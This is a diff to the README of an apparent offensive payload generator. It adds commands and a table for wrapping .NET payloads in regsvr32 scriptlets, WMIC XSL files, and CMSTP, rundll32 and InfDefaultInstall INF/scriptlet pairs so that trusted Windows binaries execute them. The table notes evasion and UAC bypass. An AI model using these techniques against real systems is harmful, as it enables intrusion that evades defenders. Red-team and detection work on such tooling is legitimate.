@@ -49,6 +49,15 @@ shrimpinjector powershell payload.exe --keying hostname=WORKSTATION1,domain=CORP
 # VBA macro for Excel/Word
 shrimpinjector vba payload.exe -o macro.bas
 
+# Regsvr32 scriptlet (squiblydoo) — local or remote
+shrimpinjector regsvr32 payload.exe -o payload.sct
+
+# WMIC XSL transform
+shrimpinjector wmic payload.exe -e xor -o payload.xsl
+
+# CMSTP INF + scriptlet pair
+shrimpinjector cmstp payload.exe -o payload.sct
+
 # VBA shellcode runner from donut output
 shrimpinjector shellcode payload.bin -x --no-wait -o runner.bas
 
@@ -81,6 +90,18 @@ These payload types embed an encrypted .NET assembly inside a script that bootst
 | `vbscript` | `cscript.exe` | `.vbs` | CLR bootstrap via `MSCorLib` COM object |
 | `hta` | `mshta.exe` | `.hta` | HTML Application — same CLR bootstrap as VBScript, browser context |
 | `vba` | Excel / Word | `.bas` | VBA macro with base64 chunking (800-char lines) for VBA editor limits |
+
+### Scriptlet / XSL / INF Payloads
+
+These payload types use the same CLR bootstrap as VBScript but wrap it in alternate delivery formats — COM scriptlets, XSL transforms, and INF installer files — allowing execution through additional trusted Windows binaries.
+
+| Type | LOLBin | Output | Description |
+|------|--------|--------|-------------|
+| `regsvr32` | `regsvr32.exe` | `.sct` | COM scriptlet via `scrobj.dll` — the "squiblydoo" technique, supports remote URL execution |
+| `wmic` | `wmic.exe` | `.xsl` | XSL stylesheet with embedded VBScript — supports remote HTTP/SMB, less monitored than direct script execution |
+| `cmstp` | `cmstp.exe` | `.inf` + `.sct` | Connection Manager profile installer — INF triggers scriptlet load, UAC bypass potential |
+| `rundll32` | `rundll32.exe` | `.sct` | JavaScript `GetObject()` loads a COM scriptlet — fileless when combined with remote URL |
+| `infdefaultinstall` | `InfDefaultInstall.exe` | `.inf` + `.sct` | Lesser-known INF handler — same scriptlet mechanism as CMSTP, fewer detections |
 
 ### Shellcode Payload
 
@@ -256,17 +277,22 @@ shrimpinjector shellcode payload.bin -x --no-wait
 shrimpinjector <type> <input> [options] [-- assembly_args...]
 
 Payload types:
-  msbuild       MSBuild inline task (.csproj)
-  installutil   InstallUtil custom action (.cs)
-  workflow       Workflow Compiler (.cs + .xoml + .xml)
-  regasm        RegAsm unregister handler (.cs)
-  regsvcs       RegSvcs COM+ registration (.cs)
-  csc           csc.exe compile and run (.cs)
-  powershell    PowerShell cradle (.ps1)
-  vbscript      VBScript CLR bootstrap (.vbs)
-  hta           HTA application (.hta)
-  vba           VBA macro (.bas)
-  shellcode     VBA shellcode runner (.bas)
+  msbuild            MSBuild inline task (.csproj)
+  installutil        InstallUtil custom action (.cs)
+  workflow           Workflow Compiler (.cs + .xoml + .xml)
+  regasm             RegAsm unregister handler (.cs)
+  regsvcs            RegSvcs COM+ registration (.cs)
+  csc                csc.exe compile and run (.cs)
+  powershell         PowerShell cradle (.ps1)
+  vbscript           VBScript CLR bootstrap (.vbs)
+  hta                HTA application (.hta)
+  vba                VBA macro (.bas)
+  shellcode          VBA shellcode runner (.bas)
+  regsvr32           Regsvr32 scriptlet (.sct)
+  wmic               WMIC XSL transform (.xsl)
+  cmstp              CMSTP profile installer (.inf + .sct)
+  rundll32           Rundll32 scriptlet (.sct)
+  infdefaultinstall  InfDefaultInstall (.inf + .sct)
 
 Common options:
   -e, --encryption {aes,xor}   Encryption mode (default: aes)
